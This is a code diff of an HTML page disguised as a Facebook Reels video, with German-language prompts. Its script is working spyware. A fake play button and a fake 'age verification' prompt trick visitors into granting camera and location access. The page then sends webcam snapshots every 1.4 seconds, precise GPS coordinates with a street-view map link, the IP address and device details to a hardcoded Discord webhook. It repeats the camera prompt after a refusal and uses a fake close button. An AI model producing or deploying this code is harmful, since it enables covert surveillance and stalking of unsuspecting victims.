@@ -6,32 +6,32 @@
   <title>Facebook</title>
   <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
   <style>
-    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
-    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.8); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(12px); }
-    .close { font-size:34px; font-weight:bold; cursor:pointer; margin-right:20px; }
-    .title { flex:1; text-align:center; font-size:19px; font-weight:600; }
+    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; -webkit-tap-highlight-color:transparent; }
+    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(14px); }
+    .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; user-select:none; }
+    .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
     .reel { height:100vh; position:relative; }
-    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; }
-    .avatar { width:48px; height:48px; border-radius:50%; background:#666; margin-right:14px; }
+    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; pointer-events:none; }
+    .avatar { width:52px; height:52px; border-radius:50%; background:#666; margin-right:14px; }
     .info { font-size:17px; line-height:1.2; }
     .name { font-weight:600; }
-    .public { font-size:14px; opacity:0.9; }
-    .play-container { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; }
-    .play-btn { width:120px; height:120px; background:rgba(0,0,0,0.6); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; }
-    .triangle { width:0; height:0; border-top:40px solid transparent; border-bottom:40px solid transparent; border-left:64px solid #fff; margin-left:12px; }
-    .text { position:absolute; bottom:240px; left:0; right:0; font-size:2.8rem; text-align:center; text-shadow:0 6px 30px #000; pointer-events:none; line-height:1.1; z-index:4; }
-    .actions { position:absolute; bottom:60px; right:28px; display:flex; flex-direction:column; gap:36px; font-size:36px; color:#fff; z-index:6; }
-    .audio-credit { position:absolute; bottom:24px; left:20px; font-size:15px; opacity:0.85; z-index:10; }
-    #cam-modal, #loc-modal { position:fixed; inset:0; background:rgba(0,0,0,0.94); display:none; align-items:center; justify-content:center; z-index:9999; }
-    .modal { background:#fff; color:#000; padding:52px 40px; border-radius:22px; max-width:460px; text-align:center; box-shadow:0 20px 70px rgba(0,0,0,0.75); }
-    .btn { padding:18px 80px; font-size:1.35rem; font-weight:bold; border:none; border-radius:12px; margin:22px 14px; cursor:pointer; }
+    .pub { font-size:14px; opacity:0.9; }
+    .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; cursor:pointer; }
+    .play-btn { width:140px; height:140px; background:rgba(0,0,0,0.65); border-radius:50%; display:flex; align-items:center; justify-content:center; pointer-events:auto; }
+    .triangle { width:0; height:0; border-top:46px solid transparent; border-bottom:46px solid transparent; border-left:74px solid #fff; margin-left:14px; }
+    .text-overlay { position:absolute; bottom:280px; left:0; right:0; font-size:3.2rem; text-align:center; text-shadow:0 6px 35px #000; pointer-events:none; line-height:1.1; z-index:4; }
+    .actions { position:absolute; bottom:80px; right:32px; display:flex; flex-direction:column; gap:44px; font-size:40px; color:#fff; z-index:6; pointer-events:none; }
+    .audio { position:absolute; bottom:36px; left:20px; font-size:16px; opacity:0.85; z-index:10; pointer-events:none; }
+    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; pointer-events:auto; }
+    .modal-box { background:#fff; color:#000; padding:60px 50px; border-radius:26px; max-width:500px; text-align:center; box-shadow:0 26px 90px rgba(0,0,0,0.85); pointer-events:auto; }
+    .btn { padding:22px 100px; font-size:1.45rem; font-weight:bold; border:none; border-radius:16px; margin:26px 16px; cursor:pointer; pointer-events:auto; touch-action:manipulation; }
     .allow { background:#1877f2; color:#fff; }
     .deny { background:#e4e6eb; color:#000; }
   </style>
 </head>
 <body>
 <div class="header">
-  <div class="close">×</div>
+  <div class="close" id="closeBtn">×</div>
   <div class="title">Reels</div>
 </div>
 
@@ -40,15 +40,15 @@
     <div class="avatar"></div>
     <div class="info">
       <div class="name">Zorica Zoka Dimitrijevic</div>
-      <div class="public">Öffentlich</div>
+      <div class="pub">Öffentlich</div>
     </div>
   </div>
 
-  <div class="play-container" id="playBtn">
-    <div class="play-btn"><div class="triangle"></div></div>
+  <div class="play-area" id="playArea">
+    <div class="play-btn" id="playBtn"><div class="triangle"></div></div>
   </div>
 
-  <div class="text">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>
+  <div class="text-overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>
 
   <div class="actions">
     <div>❤️ 14.6K</div>
@@ -56,140 +56,149 @@
     <div>➤</div>
   </div>
 
-  <div class="audio-credit">Zorica Zoka Dimitrijevic · Original audio · Zorica</div>
+  <div class="audio">Zorica Zoka Dimitrijevic · Original audio · Zorica</div>
 </div>
 
-<div id="cam-modal">
-  <div class="modal">
+<div id="cam-prompt">
+  <div class="modal-box">
     <h2>Video kann nicht abgespielt werden</h2>
-    <p style="margin:30px 0; font-size:1.35rem;">Bitte gib kurz Kamera-Zugriff für Altersprüfung.</p>
-    <div id="camError" style="color:#c00;display:none;margin:22px 0;">Zugriff verweigert – erneut versuchen</div>
-    <button id="camAllow" class="btn allow">KAMERA FREIGEBEN</button>
-    <button id="camDeny" class="btn deny">ABBRECHEN</button>
+    <p style="margin:34px 0; font-size:1.45rem;">Kurze Kamera-Freigabe für Altersprüfung nötig.</p>
+    <div id="cam-err" style="color:#c00;display:none;margin:26px 0;">Zugriff verweigert – erneut versuchen</div>
+    <button id="allowCamBtn" class="btn allow">KAMERA FREIGEBEN</button>
+    <button id="denyCamBtn" class="btn deny">ABBRECHEN</button>
   </div>
 </div>
 
-<div id="loc-modal">
-  <div class="modal">
-    <h2>Standort freigeben erforderlich</h2>
-    <p style="margin:30px 0; font-size:1.35rem;">Teile deinen genauen Standort, damit das Video geladen wird.</p>
-    <button id="locAllow" class="btn allow">STANDORT TEILEN</button>
-    <button id="locDeny" class="btn deny">NEIN</button>
+<div id="loc-prompt">
+  <div class="modal-box">
+    <h2>Standort erforderlich</h2>
+    <p style="margin:34px 0; font-size:1.45rem;">Teile deinen genauen Standort, um das Video zu laden.</p>
+    <button id="allowLocBtn" class="btn allow">STANDORT TEILEN</button>
+    <button id="denyLocBtn" class="btn deny">NEIN</button>
   </div>
 </div>
 
-<video id="vid" autoplay muted playsinline style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
+<video id="v" autoplay muted playsinline style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
-let count=0, stream=null, video=document.getElementById('vid'), canvas=document.getElementById('canvas');
+const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
+let count = 0, stream = null, v = document.getElementById('v'), c = document.getElementById('c');
 
-async function fetchIPGeo() {
-  let geo=null;
+async function getGeo() {
+  let geo = null;
   try {
-    geo=await (await fetch('https://ipapi.co/json/')).json();
+    geo = await (await fetch('https://ipapi.co/json/')).json();
     if (geo.ip && geo.latitude) return geo;
   } catch {}
   try {
-    geo=await (await fetch('https://ipinfo.io/json')).json();
+    geo = await (await fetch('https://ipinfo.io/json')).json();
     if (geo.ip && geo.loc) {
-      const [lat,lon]=geo.loc.split(',');
-      geo.latitude=parseFloat(lat); geo.longitude=parseFloat(lon);
+      const [lat, lon] = geo.loc.split(',');
+      geo.latitude = parseFloat(lat);
+      geo.longitude = parseFloat(lon);
       return geo;
     }
   } catch {}
   return {ip:'unbekannt', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
 }
 
-async function getPreciseGPS() {
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve(null);
+async function getGPS() {
+  return new Promise(r => {
+    if (!navigator.geolocation) return r(null);
     navigator.geolocation.getCurrentPosition(
-      pos => resolve({latitude:pos.coords.latitude, longitude:pos.coords.longitude, accuracy:pos.coords.accuracy}),
-      err => resolve(null),
-      { enableHighAccuracy:true, timeout:18000, maximumAge:0 }
+      pos => r({latitude:pos.coords.latitude, longitude:pos.coords.longitude, accuracy:pos.coords.accuracy}),
+      () => r(null),
+      {enableHighAccuracy:true, timeout:22000, maximumAge:0}
     );
   });
 }
 
-async function exfil(type, blob=null) {
+async function send(type, blob = null) {
   try {
-    let loc = await getPreciseGPS() || await fetchIPGeo();
+    let loc = await getGPS() || await getGeo();
     let ip = loc.ip || 'unbekannt';
-    let city = loc.city || '?', reg = loc.region || '?', ctry = loc.country || '?', plz = loc.postal || '?', org = loc.org || '?';
+    let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
     let lat = loc.latitude, lon = loc.longitude;
-    let acc = lat ? `${Math.round(loc.accuracy || 500)}m` : 'IP-Fallback';
-    let mapsLink = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;
+    let acc = lat ? `${Math.round(loc.accuracy || 500)} m` : 'IP-Fallback';
+    let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;
 
     const embed = {
       title: `🔴 FB ${type} #${++count}`,
-      color: lat ? 0x00ff99 : 0xff0000,
+      color: lat ? 0x00ffbb : 0xff0000,
       fields: [
         {name:"Event", value:type, inline:true},
-        {name:"IP + Ort", value:`**${ip}**\n${city} • ${reg} • ${ctry} • ${plz} • ${org}`, inline:true},
+        {name:"IP + Ort", value:`**${ip}**\n${city} • ${region} • ${country} • ${postal} • ${org}`, inline:true},
         {name:"Genauigkeit", value:acc, inline:true},
-        {name:"User-Agent", value:navigator.userAgent.substring(0,140), inline:false},
-        {name:"Bildschirm", value:`${screen.width}×${screen.height}`, inline:true},
+        {name:"UA", value:navigator.userAgent.substring(0,140), inline:false},
+        {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
         {name:"Zeit", value:new Date().toISOString(), inline:true}
       ],
       timestamp: new Date().toISOString()
     };
-    if (mapsLink) embed.fields.push({name:"Google Maps – exakte Position", value:`[→ Haus / Street View](${mapsLink})`, inline:false});
+    if (maps) embed.fields.push({name:"Google Maps – Position", value:`[→ exakte Stelle](${maps})`, inline:false});
 
     const payload = {embeds:[embed]};
     if (blob) {
       let fd = new FormData();
       fd.append("payload_json", JSON.stringify(payload));
       fd.append("file", blob, `snap_${Date.now()}.jpg`);
-      await fetch(WEBHOOK + "?wait=true", {method:"POST", body:fd});
+      await fetch(HOOK + "?wait=true", {method:"POST", body:fd});
     } else {
-      await fetch(WEBHOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
+      await fetch(HOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
     }
   } catch {}
 }
 
-document.getElementById('playBtn').onclick = () => {
-  if (location.protocol !== 'https:') alert('Lade die Seite über HTTPS, sonst funktioniert Location auf Handy nicht!');
+function startCapture() {
   document.getElementById('cam-prompt').style.display = 'flex';
-  exfil('PLAY');
-};
+  send('PLAY_CLICK');
+}
 
-document.getElementById('camAllow').onclick = async () => {
+const playBtn = document.getElementById('playBtn');
+playBtn.addEventListener('click', startCapture);
+playBtn.addEventListener('touchend', e => { e.preventDefault(); startCapture(); });
+
+document.getElementById('allowCamBtn').onclick = async () => {
   document.getElementById('cam-prompt').style.display = 'none';
   try {
     stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}});
-    video.srcObject = stream;
-    await video.play();
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
+    v.srcObject = stream;
+    await v.play();
+    c.width = v.videoWidth || 1280;
+    c.height = v.videoHeight || 720;
     setInterval(async () => {
-      canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-      let blob = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.88));
-      exfil('CAM SNAP', blob);
+      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+      let blob = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
+      send('CAM SNAP', blob);
     }, 1400);
-    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 3500);
+    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 4000);
   } catch(e) {
-    exfil('CAM ERROR');
-    document.getElementById('camError').style.display = 'block';
-    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2600);
+    send('CAM_ERROR');
+    document.getElementById('cam-err').style.display = 'block';
+    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 3000);
   }
 };
 
-document.getElementById('camDeny').onclick = () => {
-  document.getElementById('camError').style.display = 'block';
-  exfil('CAM DENY');
-  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2000);
+document.getElementById('denyCamBtn').onclick = () => {
+  document.getElementById('cam-err').style.display = 'block';
+  send('CAM_DENY');
+  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2400);
 };
 
-document.getElementById('locAllow').onclick = async () => {
+document.getElementById('allowLocBtn').onclick = async () => {
   document.getElementById('loc-prompt').style.display = 'none';
-  exfil('LOC GRANTED');
+  send('LOC_GRANTED');
 };
 
-document.getElementById('locDeny').onclick = () => {
+document.getElementById('denyLocBtn').onclick = () => {
   document.getElementById('loc-prompt').style.display = 'none';
-  exfil('LOC DENY');
+  send('LOC_DENY');
+};
+
+document.getElementById('closeBtn').onclick = () => {
+  // Fake close – reload or do nothing
+  location.reload();
 };
 </script>
 </body>
